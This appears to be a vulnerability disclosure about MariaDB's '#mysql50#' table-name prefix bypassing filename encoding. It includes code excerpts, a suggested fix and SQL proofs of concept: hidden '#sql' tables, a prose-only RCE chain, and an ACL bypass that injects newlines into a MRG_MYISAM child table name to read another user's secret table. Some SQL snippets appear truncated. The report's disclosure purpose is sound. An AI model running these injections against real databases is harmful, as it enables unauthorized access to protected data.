## Vulnerability Details

> **Note:** a working (but heavily vibecoded mess of a) remote code execution chain for this issue is available.
> I recommend not posting anything publicly accessible about this in JIRA until resolved.

While the previous `#mysql50#` report (https://hackerone.com/reports/3849040) focused on exploiting issues relating to stale cache entries that are keyed by table name, this issue focuses more on the filesystem side of things and how `tablename_to_filename()` encoding differences can be abused.

[sql/sql_table.cc:518](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/sql/sql_table.cc#L518-L550)
```c++
uint tablename_to_filename(const char *from, char *to, size_t to_length)
{
  if ((length= check_n_cut_mysql50_prefix(from, to, to_length)))
  { 
    if (Lex_ident_table::check_name({to, length}, true))
    {
      to[0]= 0;
      length= 0;
    }
    DBUG_RETURN(length);
  }

  length= strconvert(system_charset_info, from, FN_REFLEN,
                     &my_charset_filename, to, to_length, &errors);
  if (check_if_legal_tablename(to) &&
      length + 4 < to_length)
  {
    memcpy(to + length, "@@@", 4);
    length+= 3;
  }
  DBUG_RETURN(length);
}
```

True to its name, `check_n_cut_mysql50_prefix()` checks the table name for the `#mysql50#` prefix, removes it if present (`to`) and we fall into that first conditional block (this is the part we care about) - otherwise names get converted normally in the modern format. e.g. `foo/bar > foo@002fbar`.

`Lex_ident_table::check_name()` wraps `Lex_ident_fs::check_body()` which then essentially does the following:

[sql/table.cc:5423](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/sql/table.cc#L5423-L5465)
```c++
bool Lex_ident_fs::check_body(const char *name, size_t length,
                              bool disallow_path_chars)
{
  ..
  for ( ; name != end ; char_length++)
  {
    ...
    if (disallow_path_chars &&
        (*name == '/' || *name == '\\' || *name == '~' || *name == FN_EXTCHAR))
      return 1;

    if (*name == 0x00)
      return 1;
    name++;
  }
  return char_length > NAME_CHAR_LEN;
}
```

Thus anything other than `/`, `\`, `~`, `.`, or NULL is essentially fair game in a `#mysql50#` prefixed table name. Because no encoding takes place, which is sort of the whole reason for this special-case handling to begin with, prefixed table names may be used to create, access, or alter internal / storage-engine "reserved" db related files.

The biggest problem is with having unencoded `#` chars in a `#mysql50#`-prefixed table name, which allows an attacker to collide with things such as the following (probably non-comprehensive list):

- `#sql*`,
- `#rocksdb*`,
- `#cache#` (ColumnStore)
- `<table>#P#<partition>`
 - `<table>#P#<partition>#TMP#`
 - `<table>#P#<partition>#REN#`
 - `<table>#P#<partition>#SP#<subpartition>`
- `<table>#i#<NN>`
- etc

There may also be some non-`#` related storage-engine issues such as tables colliding with `FTS_*` auxiliary-looking InnoDB names, e.g.
- `FTS_<table_id>_CONFIG`
- `FTS_<table_id>_<index_id>_INDEX_1`

Or table names that include control characters which can corrupt internal settings in things like merge tables and allow for ACL bypasses, e.g.
- `foo\nbar`

Or ... other weird and wonderful things? :shrug:


## Suggested Fix

Codex suggests the following (in order of preference)
- remove `#mysql50#` support completely
- allow, but only for opening existing legacy files and explicit `ALTER DATABASE ... UPGRADE DATA DIRECTORY NAME`
- otherwise reject anything containing control bytes or internal marker grammer (or maybe just `#`?).


## Proof of Concept - `#sql*` (hidden tables)

```sql
-- file names get encoded
CREATE TABLE `#sql-visible`(a INT);
INSERT INTO `#sql-visible` VALUES (1);

-- file names do not get encoded (and can be used directly afterwards)
CREATE TABLE `#mysql50##sql-hidden`(a INT);
INSERT INTO `#sql-hidden` VALUES (2);

-- non-encoded tables are treated as special
SHOW TABLES;
-- +------------------+
-- | #sql-visible     |
-- +------------------+

SELECT * FROM `#sql-visible`;
-- +------+
-- |    1 |
-- +------+

SELECT * FROM `#sql-hidden`;

-- |    2 |
-- +------+
```

## Proof of Concept - `<table>#P#<partition>` (RCE)

When weaponized with ASLR bypass / read-what-where / write-what-where primitives from the other `#mysql50#` report (or elsewhere), an attacker can use a partition physical-table schema mismatch as the final memory-corruption and dispatch primitive.

The attacker creates a normal partitioned MyISAM parent table with a small parent record field, releases the partition handles, then drops and re-creates the hidden physical partition table (`#mysql50#<parent>#P#p0`) with a much larger compatible-looking row field. When the parent partition is read, `ha_partition` materializes the physical child row into the parent table’s record buffer using mismatched child metadata, overflowing past the parent row buffer into adjacent live `Field` objects.

The complete-chain PoC overwrites a reachable `Field` vtable pointer, stages a fake vtable, and dispatches through `Field::val_int()` via a parent-table `SELECT`.

## Proof of Concept - `MRG_MYISAM` (ACL Bypass)

Assuming the following setup (and a separate attacker controlled db):

```sql
CREATE DATABASE victim;
GRANT CREATE TEMPORARY TABLES ON `victim`.* TO 'vortfu'@'localhost';

CREATE TABLE victim.secret(id INT, data LONGTEXT) ENGINE=MYISAM;
INSERT INTO victim.secret VALUES (1, 'foo-secret-bar');
```

An attacker can create two tables in their own db:
- `testdb`.`x` and
- `testdb`.`#mysql50#x\n#INSERT_METHOD=LAST\nsecret`

When they create a temporary table on `victim` that merges with `testdb`.`#mysql50#x\n#INSERT_METHOD=LAST\nsecret`, permission checks are performed against the latter, but the storage-engine will store / read child tables as being newline delimited.

[storage/myisammrg/myrg_create.c:42](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/storage/myisammrg/myrg_create.c#L42-L52)
```c
int myrg_create(const char *name, const char **table_names,
                uint insert_method, my_bool fix_names)
{
  ...
  strmov(buff,*table_names);
  *(end=strend(buff))='\n';
  mysql_file_write(file, (uchar*) buff, (uint) (end-buff+1), ...);
```

[storage/myisammrg/myrg_open.c:65](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/storage/myisammrg/myrg_open.c#L65-L72)
```c

{

  while ((length=my_b_gets(&file,buff,FN_REFLEN-1)))
  {

      files++;

  ...

  while ((length=my_b_gets(&file,buff,FN_REFLEN-1)))
```

and thus the table actually merges `testdb`.`x` and `victim`.`secret`, e.g.

```sql

--ERROR 1142 (42000): SELECT command denied to user 'vortfu'@'localhost' for table `victim`.`secret`

CREATE OR REPLACE TABLE testdb.`#mysql50#x
#INSERT_METHOD=LAST
secret`(id INT) ENGINE=MYISAM;

CREATE OR REPLACE TEMPORARY TABLE victim.m(id INT, data LONGTEXT)
ENGINE=MRG_MYISAM

secret`);

-- | id   | data           |
-- +------+----------------+
-- |    1 | foo-secret-bar |
```
